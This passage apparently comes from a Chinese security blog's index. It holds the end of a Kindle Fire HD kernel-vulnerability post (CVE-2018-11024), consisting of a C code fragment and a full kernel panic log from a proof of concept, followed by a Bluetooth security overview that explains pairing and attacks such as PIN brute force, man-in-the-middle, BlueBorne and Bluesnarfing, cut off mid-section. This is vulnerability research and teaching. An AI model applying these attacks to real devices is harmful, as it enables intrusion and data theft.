i, ptr_arr[i]); free(ptr_arr[i]); } free(ptr_arr); for (i=0; i &lt; num_generics; i++) { free(generic_arr[i]); } write(client_sock, &amp;msg_size, 4); msg_size = 0; } if(read_size == 0) { puts(&quot;Client disconnected&quot;); fflush(stdout); close(client_sock); goto listen; } else if(read_size == -1) { perror(&quot;recv failed&quot;); } return 0;} 崩溃日志 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166[ 144.428375] Unable to handle kernel paging request at virtual address d900000c[ 144.436462] pgd = dcac0000[ 144.439697] [d900000c] *pgd=00000000[ 144.443939] Internal error: Oops: 5 [#1] PREEMPT SMP ARM[ 144.450012] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)[ 144.457672] CPU: 0 Tainted: G O (3.4.83-gd2afc0bae69 #1)[ 144.465118] PC is at c2dm_l1cache+0x30/0x100[ 144.469940] LR is at dev_ioctl+0x3f0/0x10c4[ 144.474670] pc : [&lt;c03187ac&gt;] lr : [&lt;c031782c&gt;] psr: a0000013[ 144.474670] sp : c2d6be38 ip : 00000000 fp : c2d6be6c[ 144.487640] r10: 00000000 r9 : d8c0cca8 r8 : 00b8dd90[ 144.493621] r7 : 00000000 r6 : c2d6bea4 r5 : 00b8dd90 r4 : 388b77c4[ 144.500915] r3 : d9000004 r2 : 75e0c121 r1 : c2d6bea4 r0 : 00000000[ 144.508331] Flags: NzCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user[ 144.516418] Control: 10c5387d Table: 9cac004a DAC: 00000015[ 144.522827] [ 144.522857] PC: 0xc031872c:[ 144.527954] 872c e51b2034 e592300c eaffffa5 e30c281c e34c209d e5923000 e3530000 1affffbd[ 144.538482] 874c eaffffc0 e51b303c e51b1040 e2833001 e51b2034 e1530001 e50b303c e2822010[ 144.549163] 876c e50b2034 1affff8c eaffff83 c09dc81c e1a0c00d e92ddff0 e24cb004 e24dd00c[ 144.559844] 878c e3500000 e1a07002 e50b0030 da00000d e0814200 e1a06001 e1a03001 e3a02000[ 144.570404] 87ac e5930008 e593c004 e2833010 e1530004 e022209c 1afffff9 e3520902 3a000003[ 144.581085] 87cc e3570002 9a000022 e24bd028 e89daff0 e59f9090 e2818008 e3a0a000 e5963008[ 144.591735] 87ec e5184008 e3530000 13a05000 1a00000a ea000010 e5181004 e5993024 e0841001[ 144.602416] 880c e12fff33 e5962008 e2855001 e596300c e1550002 e0844003 2a000006 e2572000[ 144.612976] [ 144.612976] LR: 0xc03177ac:[ 144.618072] 77ac ebf55c15 eaffff35 e3053d8d e3443038 e1510003 1affff30 e1a0200d e3c23d7f[ 144.628631] 77cc e3c3303f e24b0064 e5933008 e2952038 30d22003 33a03000 e3530000 1a0001a8[ 144.639160] 77ec e1a01005 e3a02038 ebfcfa90 e3500000 1a00000e e51b2030 e3520001 0a0001cb[ 144.649780] 780c e3520002 0a0001ee e3520000 1a000007 e51b0064 e3a02000 e24b1060 eb0003d3[ 144.660369] 782c e51b0064 e24b1060 e51b2030 eb000338 e3a05000 eaffff11 e24b1064 e50b1088[ 144.670776] 784c e51b0088 e3a01010 ebfd03c1 e3a03004 e50b3064 e5963008 e2952004 30d22003[ 144.681213] 786c 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f e3c6603f[ 144.691528] 788c e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064 e1a01005[ 144.701995] [ 144.701995] SP: 0xc2d6bdb8:[ 144.706878] bdb8 c2d6be24 00b8dd90 c2d6bdec c2d6bdd0 c00084d0 c03187ac a0000013 ffffffff[ 144.717407] bdd8 c2d6be24 00b8dd90 c2d6be6c c2d6bdf0 c06a5318 c0008370 00000000 c2d6bea4[ 144.727905] bdf8 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4 00000000 00b8dd90 d8c0cca8[ 144.738586] be18 00000000 c2d6be6c 00000000 c2d6be38 c031782c c03187ac a0000013 ffffffff[ 144.749145] be38 c02ba53c 575b4b92 d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90[ 144.759796] be58 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088[ 144.770355] be78 000ffeff 00000001 c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000[ 144.781005] be98 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261[ 144.791687] [ 144.791687] FP: 0xc2d6bdec:[ 144.796661] bdec c0008370 00000000 c2d6bea4 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4[ 144.807189] be0c 00000000 00b8dd90 d8c0cca8 00000000 c2d6be6c 00000000 c2d6be38 c031782c[ 144.817840] be2c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 00000000 00b8dd90[ 144.828399] be4c 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c[ 144.839080] be6c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc c2d6be90 c0207454[ 144.849761] be8c c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f[ 144.860290] beac 83b275c7 00000000 00020261 00000000 00000000 00000000 00000000 00000000[ 144.870971] becc 00000000 00000000 00000000 c02089fc 00000000 dcae46c0 0000000b dcae46c0[ 144.881652] [ 144.881652] R1: 0xc2d6be24:[ 144.886627] be24 c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000[ 144.897308] be44 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04[ 144.907989] be64 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc[ 144.918518] be84 c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92[ 144.929199] bea4 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000[ 144.939849] bec4 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0[ 144.950531] bee4 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044[ 144.961059] bf04 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440[ 144.971710] [ 144.971710] R3: 0xd8ffff84:[ 144.976623] ff84 d8ffff20 d8efb000 00000707 020e40fb d8efb075 d8ffff3c d8efb01c d8ffffa0[ 144.987213] ffa4 d8ffffa0 d8efb028 ca9788f0 d8ffffb0 d8ffffb0 00000000 bf06e9c8 80000088[ 144.997772] ffc4 dd2eac00 dd309540 00000000 00000000 00000000 00000000 00000000 00000000[ 145.008392] ffe4 00000000 00000000 00000000 00000000 00000000 00000000 00000000 ********[ 145.018798] 0004 ******** ******** ******** ******** ******** ******** ******** ********[ 145.029327] 0024 ******** ******** ******** ******** ******** ******** ******** ********[ 145.039886] 0044 ******** ******** ******** ******** ******** ******** ******** ********[ 145.050384] 0064 ******** ******** ******** ******** ******** ******** ******** ********[ 145.060913] [ 145.060913] R6: 0xc2d6be24:[ 145.066009] be24 c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000[ 145.076568] be44 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04[ 145.087219] be64 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc[ 145.097900] be84 c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92[ 145.108459] bea4 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000[ 145.118988] bec4 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0[ 145.129638] bee4 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044[ 145.140319] bf04 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440[ 145.150848] [ 145.150848] R9: 0xd8c0cc28:[ 145.155944] cc28 d8c0cc28 d8c0cc28 00000000 00000000 00000000 c06bc674 000200da c09dda58[ 145.166503] cc48 00000000 00000000 d8c0cc50 d8c0cc50 00000000 c0aa5174 c0aa5174 c0aa5148[ 145.177062] cc68 5aefd94b 00000000 00000000 00000000 d8c0cc80 9ad1f453 00000000 00000000[ 145.187713] cc88 00200000 00000000 00000000 d8c0cc94 d8c0cc94 dd3b56c0 dd3b56c0 00000000[ 145.198394] cca8 000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400[ 145.208923] ccc8 d8c0cd80 dd3e3e70 00001064 00000001 0fb00000 5aefd94b 2d2b4d13 5aefd94b[ 145.219573] cce8 2d2b4d13 5aefd94b 2d2b4d13 00000000 00000000 00000000 00000000 00000000[ 145.230255] cd08 00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0cd24[ 145.240936] Process executor32 (pid: 3810, stack limit = 0xc2d6a2f8)[ 145.248016] Stack: (0xc2d6be38 to 0xc2d6c000)[ 145.253082] be20: c02ba53c 575b4b92[ 145.262176] be40: d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000[ 145.271392] be60: c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001[ 145.280609] be80: c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8[ 145.289703] bea0: 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000[ 145.298919] bec0: 00000000 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000[ 145.308105] bee0: dcae46c0 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08[ 145.317352] bf00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190[ 145.326416] bf20: dcf8c440 c2d6bf0c c2d6a000 00b8dd80 00b8dd90 40385d8d dcae46c0 0000000b[ 145.335662] bf40: c2d6a000 00000000 c2d6bf64 00000000 00b8dd90 40385d8d dcae46c0 0000000b[ 145.344879] bf60: c2d6a000 00000000 c2d6bfa4 c2d6bf78 c01365e0 c0135fc4 00000000 00000000[ 145.354095] bf80: c0013e08 00b8dd80 000121c0 00000000 00000036 c0013e08 00000000 c2d6bfa8[ 145.363159] bfa0: c0013c60 c0136578 00b8dd80 000121c0 0000000b 40385d8d 00b8dd90 00b8dd90[ 145.372406] bfc0: 00b8dd80 000121c0 00000000 00000036 00000000 00000000 00000000 bee035f4[ 145.381622] bfe0: 810100fc bee030f4 00011578 0002b28c 60000010 0000000b 4d6969d9 03020430[ 145.390686] Backtrace: [ 145.393829] [&lt;c031877c&gt;] (c2dm_l1cache+0x0/0x100) from [&lt;c031782c&gt;] (dev_ioctl+0x3f0/0x10c4)[ 145.403228] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)[ 145.412658] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)[ 145.421874] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)[ 145.431304] r8:c0013e08 r7:00000036 r6:00000000 r5:000121c0 r4:00b8dd80[ 145.439605] Code: e0814200 e1a06001 e1a03001 e3a02000 (e5930008) [ 145.450225] Board Information: [ 145.450225] Revision : 0001[ 145.450256] Serial : 0000000000000000[ 145.450256] SoC Information:[ 145.450256] CPU : OMAP4470[ 145.450286] Rev : ES1.0[ 145.450286] Type : HS[ 145.450286] Production ID: 0002B975-000000CC[ 145.450286] Die ID : 1CC60000-50002FFF-0B00935D-11007004[ 145.450317] [ 145.485900] ---[ end trace 0fe3b4c74b4e9fa7 ]---[ 145.491149] Kernel panic - not syncing: Fatal exception[ 145.496917] CPU1: stopping[ 145.500152] Backtrace: [ 145.503204] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)[ 145.512695] r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950[ 145.519714] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)[ 145.528961] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)[ 145.538482] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40/0x60)[ 145.547637] Exception stack(0xd85a5fb0 to 0xd85a5ff8)[ 145.553466] 5fa0: 41822290 418185e8 00000001 41c95000[ 145.562561] 5fc0: 418185e8 41687460 4010d0ec 418185e8 4010d038 41689398 7fffffff 401602ec[ 145.571777] 5fe0: 418191e8 5ba34d10 41609aa8 41609974 200b0010 ffffffff[ 145.579284] r6:ffffffff r5:200b0010 r4:41609974 r3:41822290[ 145.586364] CPU0 PC (0) : 0xc003ee38[ 145.590576] CPU0 PC (1) : 0xc003ee54[ 145.594635] CPU0 PC (2) : 0xc003ee54[ 145.598693] CPU0 PC (3) : 0xc003ee54[ 145.602722] CPU0 PC (4) : 0xc003ee54[ 145.606781] CPU0 PC (5) : 0xc003ee54[ 145.610839] CPU0 PC (6) : 0xc003ee54[ 145.614898] CPU0 PC (7) : 0xc003ee54[ 145.619110] CPU0 PC (8) : 0xc003ee54[ 145.623168] CPU0 PC (9) : 0xc003ee54[ 145.627227] CPU1 PC (0) : 0xc0019b2c[ 145.631408] CPU1 PC (1) : 0xc0019b2c[ 145.635467] CPU1 PC (2) : 0xc0019b2c[ 145.639495] CPU1 PC (3) : 0xc0019b2c[ 145.643707] CPU1 PC (4) : 0xc0019b2c[ 145.647766] CPU1 PC (5) : 0xc0019b2c[ 145.651824] CPU1 PC (6) : 0xc0019b2c[ 145.656005] CPU1 PC (7) : 0xc0019b2c[ 145.660064] CPU1 PC (8) : 0xc0019b2c[ 145.664123] CPU1 PC (9) : 0xc0019b2c[ 145.668182] [ 145.669952] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017[ 145.669982]","link":"/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11024%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"},{"title":"蓝牙安全以及相关漏洞研究","text":"放大佬总结的一张图： 蓝牙是一种无线通信标准，工作在2.4～2.485Ghz的ISM频段，主要用于短距离的数据连接，可以建立所谓的PAN(Personal Area Network)网络。蓝牙设备最常见的应用是各种以手机和电脑为中心的外围设备，例如与手机配合使用的蓝牙耳机、手机与汽车音响的互联、蓝牙键盘和鼠标等。 0x00 蓝牙技术简介蓝牙”，即Bluetooth，是斯堪的纳维亚语中 Blåtand / Blåtann 的英化版本。该词是十世纪的一位国王Harald Bluetooth的绰号，相传他将纷争不断的丹麦部落统一为一个王国，并引入了基督教。蓝牙技术开发者Jim Kardach于1997年提出用Bluetooth这个名词，据说他当时正在读一本名为The Long Ships的小说，讲述的就是维京人和Harald Bluetooth国王的故事。他认为蓝牙可以把各种不同的通信协议统一在一起，诚如这位国王做的事情一样。至于蓝牙的logo，取自国王Harald Bluetooth名字中的【H】和【B】两个字母的组合，用古北欧文字来表示： ​ 蓝牙技术最早是1994年由爱立信发明的，最初的目的是用无线连接来代替RS-232线缆连接。目前蓝牙标准由Bluetooth Special Interest Group (SIG) 组织管理。这一组织有超过25000个成员公司，分布在电信、计算机、网络和消费电子领域。 蓝牙工作在2.4～2.485GHz频段，有79个频道，每个频道占据1MHz宽带。因为2.4GHz的ISM频段是非常繁忙的，为了对抗其他系统的干扰，蓝牙采取跳频式的扩频技术，通常1秒钟跳跃1600次。BLE(Bluetooth Low Energy)只有40个频道，每个频道占据2MHz宽带. 蓝牙是一种基于数据包通信的协议，使用主-从式的网络结构。在一个piconet中，1个主节点可以与多达7个从节点通信。所有的设备都共享主节点的时钟。数据包以312.5us的间隔互相交换，这个时间成为clock tick。两个clock tick构成一个625us的时隙，两个时隙构成一个1250us的时隙对。一种比较简单的时隙配置是，主节点在偶数时隙发送数据包，在奇数时隙接受数据包；从节点相反，在偶数时隙接受数据包，在奇数时隙发送数据包。这里讨论的是经典的蓝牙协议，BLE的空中接口协议与经典的蓝牙协议有很大的不同。蓝牙协议还支持多个piconet连接在一起，组成scatternet。在这种情况下，某些设备可以在一个piconet中担任主节点，在离另一个piconet中知识从节点。 蓝牙技术已经发展了很多年，蓝牙规范有很多个版本，从最早的蓝牙1.0到2014年发布的蓝牙4.2。早期的蓝牙标准只能支持几百Kbps的传输速率，而到了蓝牙3.0版本，已经可以支持最高24Mbps的传输速度。蓝牙4.0版本引入了BLE协议，即低功耗蓝牙，其功耗非常低，可以使设备的电池维持很长的时间，因此在很多可穿戴设备中得到了应用。 一文读懂蓝牙技术从 1.0 到 5.0 的前世今生 (https://zhuanlan.zhihu.com/p/37725574) 0x01 蓝牙安全概述蓝牙协议有加密和鉴权功能。蓝牙的密钥产生是基于蓝牙的PIN码的。PIN码需要输入到蓝牙设备中，或者出场时就已经写入设备里。在美国国家标准技术研究所官网上有一份蓝牙安全指南Guide to Bluetooth Security(https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-172-draft.pdf)中介绍了如何安全的使用蓝牙技术。使用蓝牙技术非常简单、易用、但是也有明显的缺点，容易被拒绝服务攻击、窃听、中间人攻击、数据篡改、占用资源。所有在选用蓝牙技术时，必须充分评估能否接受这样的风险。这份指南同时也给出了一些知道，在创建和维护一个蓝牙系统时，如何去降低他的安全风险。 2001年，内尔实验室的Jakobsson和Wetzel发现了蓝牙配对协议中的缺陷，以及加密方法中的漏洞。2003年，A.L.Digital公司的两位研究人员Ben和Adam Laurie发现，在一些蓝牙产品中有严重的漏洞，能够导致个人隐私数据的泄漏。于是，接下来就出现了一种利用这种BlueBug攻击手法，开始展现出这一漏洞的危害性 2004年，第一个所谓的蓝牙病毒出现，它可以在Symbian操作系统的手机中传播。这个”病毒”是一个名叫”29A”的团队编写的PoC程序，写出来之后就交给了反病毒机构，因此它具有威胁性，但并没有真正的传播过。2004年8月，一项实验创纪录地把蓝牙连接的距离增加到了1.79公里，在实验中使用了方向性天线和功率放大器。这就增加了蓝牙病毒的危险性，使得它能够威胁到距离非常远的蓝牙设备 2005年1月，出现了一种名为”Lasco.A”的手机蠕虫病毒，也是针对Symbian手机的。用户一旦通过蓝牙接收这个病毒文件，病毒就会自动地安装在系统中，然后开始寻找周围其他的蓝牙设备去感染。另外这种病毒还能感染系统中的其他SIS文件。最终的后果是导致手机系统不稳定。 2005 年4月，剑桥大学的安全研究人员公布了他们发现的一种被动式攻击方式， 能够攻击基于PIN码的配对协议。这种攻击方式操作起来非常快，证实了蓝牙的对称密钥的建立方法是有缺陷的。为了抵御这种攻击，研究人员提出了-种更强的非对称密钥加密方法。 2005年6月，Yaniv Shaked和Avishai Wool发表了一篇论文，提出了被动式和主动式两种攻击方式，可以获得PIN码。在被动式攻击中，攻击者在蓝牙设备初始配对的时刻就能窃听到通信的内容:而主动式攻击则需要在某个特定的时刻发出一-种特殊构造的数据包，使主节点和从节点重复配对过程，之后就可以使用被动式攻击在配对过程中侦听密钥了。这种攻击的主要弱点在于，它需要受到攻击的用户在攻击期间重新输入PIN码，此时设备会有提示。另外，这种攻击还需要一些特别的设备在恰当的时刻发出一种特殊构造的数据包，现成的蓝牙芯片是不.能做到这一- 点的。 蓝牙地址还可以用于追踪设备的位置。2005 年8月，英格兰剑桥郡的警方发出警示说，有些小偷利用蓝牙来探查车内是否有被遗忘的手机或电脑等设备，提示人们在不使用蓝牙功能时尽量关闭它。 2006年4月，来自Secure Network和F-Secure的研究人员发布了一份报告，警告有大量留在“可见”状态的设备，还报告了各种蓝牙服务的普及程度，以及与蓝牙蠕虫传播的危险性有关的统计数据。 2007年10月，在卢森堡的Hack.lu Security会议上，Kevin Finistere和Thiery Zoller演示了通过蓝牙远程rootMacOSXv10.3.9和v10.4系统，还演示了一个蓝牙PIN码和Linkeys破解器。 维基百科.上介绍的以上这些蓝牙安全的案例都至少是9年以前的事情了。那么近些年来，在蓝牙安全领域又有什么攻击方式 0x02 BLE工作流程1.工作流程BLE低功耗蓝牙适用于短距离无线通信，正常与形式传输距离为10m(低功耗模式下为100m)，频段2.4Ghz。先进行三个蓝牙术语介绍： 配对：配对是指两个蓝牙设备首次通讯时，互相确认的过程。两个蓝牙设备之间一经配对之后，随后的通讯连接就不必每次都要做确认，非常的方便 PIN：个人识别码，蓝牙适用的PIN码长度为1-8个十进制位(8-128比特) DB_ADDR：蓝牙设备地址。每个蓝牙收发器被分配了唯一的一个48位的设备地址，类似于PC机网卡的MAC地址。两个蓝牙设备在通讯开始时通过询问的方式获取对方的DB_ADDR地址 蓝牙的工作过程为: ​ 蓝牙启动 -&gt; 扫描设备 -&gt; 设备配对（未配对的设备） -&gt; 数据传输 2.设备配对模式 Numeric Comparison：配对双方都显示一个6位数的数字，由用户来核对数字是否一致，一致即可配对。例如手机之前的配对。 Just Works：用于配对没有显示没有输入的设备，主动发起连接即可配对，用户看不到配对过程。例如连接蓝牙耳机。 Passkey Entry：要求配对目标输入一个在本地设备上显示的6位数字，输入正确即可配对。例如连接蓝牙键盘 Out of Band：两设备通过别的途径交换配对信息，例如nfc等。例如一些NFC蓝牙音响 3.设备配对过程a PIN码配对在老的蓝牙2.0协议中，配对过程需要输入一个PIN码，长度可以从4到16个数字。（很多设备默认为0000或者1234） 在配对的过程中通过PIN码来生成Linkkey。两个配对后的设备共享一个Linkkey，这个行为叫绑定。绑定之后下次两个设备接近后，用Linkkey进行认证，认证通过后生成EncryptionKey进行session的加密。认证的过程采用challenge-reponse的模式，以claimant and the verifier的方式来验证linkkey。认证完一方之后交换身份，在认证另一方。 b 密钥交换配对后续蓝牙协议配对则通过密钥交换来完成，又分为生成初始密钥(Kinit)、生成链路密钥(Kab)和双方认证三个过程。 生成舒适密钥(Kinit)：初始密钥Kinit长度为128位，由E22算法产生。首先提出通信要求的设备成为主设备(Master)，用A表示;被动进行通信的设备称为从设备(Slave),用B表示。E22算法的输入(明文）由以下三部分组成： 从设备的物理地址：BD_ADDR,在生成Kinit前，主设备通过询问方式获得从设备的地址BD_ADDR。 PIN码及其长度，PIN码是双方设备预先设定的。 有一个128位的随机数(IN_RAND)。由主设备产生，并以明文方式传送给从设备。 由于主、从设备使用了相同的E22算法，如果双方设备以上三部分的值都相等，那么各自算出来的Kinit也应该相同。 ​ 生成链路密钥(Kab)：首先主设备A产生128位的随机数LK_RANDA，从设备B也产生128位的随机数LK_RANDB。在主设备A中，Kinit与LK_RAND进行位比特逻辑异或运算，异或结果发送给B设备；同样的，在B设备中，Kinit和LK_RANDB进行位比特逻辑异或运算，结果发送给A设备。通过这些交换后，A和B设备都具有相同的Kinit、LK_RANDA和LK_RANDAB。设备A和B分别用E21算法将LK_RANDA和LK_RANDB。设备A和B分别用E21算法将LK_RANDA和BD_ADDRA、LK_RANDB和BD_ADDRB加密，并将结果进行异或得到Kab。 ​ 双方认证：双向认证采用challenge-response(挑战-应答)方式。主设备A位应答方，从设备B为请求方。作为应答方的A设备产生一个128位的随机数AU_RANDA，并以明文的方式传送至B设备。A、B设备都用E1算法将各自的到的AU_RAND、Kab和BD_ADDRB加密运算分别生成32位的SRESA和SRESB。B设备将结果SRESB传送给A设备，A设备比较SERESA和SERSB，如果两个的值相等，此次认证通过，如果两个的值不想等，则认证不通过。执行完此次认证后，A设备和B设备的角色对换，即A设备作为请求方，B设备作为应答方，采用同样的方式进行认证。 ​ 0x03 BLE常见问题蓝牙（bluetooth）同WIF和zigbee等等网络协议一样，因此它的网络协议通信结构和它们大同小异。 因此，它的攻击手段不外乎鉴权攻击、密钥攻击、拒绝服务攻击等等几种手段，只不过随着具体的场景不同，这些攻击手段所赐啊去的具体方法也不同。 在上述的几种攻击方法里，蓝牙的安全问题可以分为两类：第一类是蓝牙协议本存在的问题。例如有攻击工具：Bluenarfing、Bluebugging、Hijacking等。 1.针对蓝牙协议本身的攻击a.节点密钥攻击（中间人）假设一个设备A和B之前已经通信过，当通信完成之后，A和B是互相知道彼此的链路密钥的。这里解释一下什么叫链路密钥：A和B之间的通信是需要加密的，怎么加密的不管，总之就是需要一个链路密钥这样的一个东西，每次通信的链路密钥是根据蓝牙本身自带生成的，这个链路密钥不是放在协议层生产的，而是蓝牙硬件自身就有的。那么B显然之后A所使用的链路密钥，那么B通过修改自身地址，把自己的地址改为A的地址后，伪装成A和C通信，那么C此时就以为自己和A通信。B也可以伪装成C和A去通信，因为B知道A的链路密钥，B是能够通过A的认证从而和A进行连接 。 这样 A和 C之间并没有进行实质的通信 ，都是B分别伪装和A，C通信。这样就造成了中间人攻击。 这种中间人攻击的主要原因在于蓝牙通信链路密钥在硬件层生产，而且每次认证都相同。 b.针对PIN码攻击两个设备之间的链接，在应用层上使用PIN码，4位PIN码破解仅仅需要0.06秒，8位暴力攻击不到两个小时就能破解。 c.中继攻击蓝牙设备使用中继以夸大传输距离，几乎所有的中继攻击，中继设备都有可能遭到信息窃取 d.鉴权DOS攻击鉴权时的DOS攻击是从上一次鉴权失败到下一次可以发起鉴权期间，第三方通过伪装发起故意使鉴权失败，从而使间隔时间持续上升，知道达到允许的最大值，在此期间双方不能进行正常的鉴权。 还有一种形式的DOS攻击，快速不断的给远程蓝牙发送文件，而远端设备呗大量的是否要接收该文件的命令冲击直到瘫痪。 2.针对蓝牙实现过程发起的攻击a. BlueBorne https://armis.com/blueborne/ 基于蓝牙协议漏洞的BLUEBORNE攻击综合分析报告 BlueBorne 蓝牙漏洞深入分析与PoC 是由armis爆出的一系列蓝牙的漏洞，只要手机开启了蓝牙，就可能被远程控制。当然根据上面的分析可以看到通过多种平台的漏洞综合利用，可以完成对大部分支持蓝牙的设备进行攻击。但是在安天的报告里有一句我没懂“不像其它驱动一样，每个操作系统都只有一个蓝牙协议栈，这导致一个漏洞的出现将会影响一系列基于此系统的设备。”其他驱动是啥样？大概的意思就是内核驱动的漏洞吧，不过能看到的是通过这组漏洞可以实现ios，android，linux的rce，以及windows下的中间人攻击。 b. GATT https://gattack.io/ 从蓝牙4.0的低功耗蓝牙（BLE）开始到4.2开始支持GATT（Generic Attribute Profile）再到BLE5，蓝牙技术已经瞄准了物联网这个方向。所以很多特性都是针对物联网的情景而生的，比如GATT。GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等用于让两个设备进行连接后的通讯。GATT 定义设备之间通过 Service 和 Characteristic 的东西来进行通讯，不同的 Characteristic 代表设备的不同功能。GATT协议可以在蓝牙设备不完成配对的情况下进行访问，因此，通信流量明文传输，如果应用层没有加密或者校验，则可以被轻易地嗅探和伪造数据。 相关paper: GATTACKING BLUETOOTH SMART DEVICES BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals c.Bluesnarfing蓝牙定义了OBEX协议，只鹅个协议的重要目的是实现数据对象的交换。蓝牙早期规范定义了一个基于OBEX的应用，这个应用主要用来实现使用蓝牙来传输一些名片，这个过程并不需要使用鉴权机制，Bluesnarfing就是利用此漏洞连接到手机用户，并且不提示用户已连接。 当不使用蓝牙时，将设备设置成不可发现的模式，或者在通信时将设备设置成为安全模式3来启动链路鉴权，对一些蓝牙设备进行升级可以有效预防此类攻击。 d.BluebuggingBluebugging和Bluesnarfing相似，在事先不通知货提示手机用户的情况下，访问手机命令。 e.Peripheral Hijacking有些设备尽管没有进入连接模式也会对连接请求进行相应，这类设备通常是一些没有MMI（Man Machine Interface）的设备。例如一些蓝牙耳机会被强制连接，还有一些设备有固定的PIN码，Peripheral Hijacking即是对此类设备进行攻击。 f.BluejackingBluejacking是指手机用户使用蓝牙无线技术匿名向赴京的蓝牙用户发送名片或不许奥信息的行为。Bluejacking通常会寻找ping的通的手机或者有反应的手机，随后会发送更多的其他个人信息到该设备。现在市场上已经出现了很多Bluejacking软件。可以通过把手机设置成不可发现模式来避免此类攻击。 0x04 信道BLE的物理通道即”频道”，分别是‘f=2402+k*2 MKz, k=0 , … ,39’, 宽带为2MHz的40个RF Channel。 其中，有3个信道是advertising channel(广播通道)，分别是37、38、39，用于发现设备(Scanning devices)、初始化连接(initiating a connection)和广播数据(broadcasting date) 剩下的37个信道为data channel(数据通道)，用于两个连接的设备间的通讯。 0x05 BLE数据包格式在低功耗蓝牙规范中，分广播报文和数据报文这两种。设备利用广播报文发现、连接其它设备，而在连接建立之后，便开始使用数据报文。无论是广播报文还是数据报文，链路层只使用一中数据包格式，它由”前导码”(preamble)、”访问码”(access code)、”有效载荷”和”循环冗余校验”（Cyclical Redundancy CHeck，CRC）校验码组成。其中，”访问码”有时又称为”访问地址”(access address) ​ 1.Preamble1个字节长度，接受中用于频率同步、数据速率同步、自动增益控制调整，固定为 01010101或者10101010序列 2.Access Address4个字节长度，广播报文接入地址为：0x8E89BED6,数据报文接入地址为：32bits随机数 3.PDUi.广播报文（见嫌疑BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.3） ​ i. PDU Type: 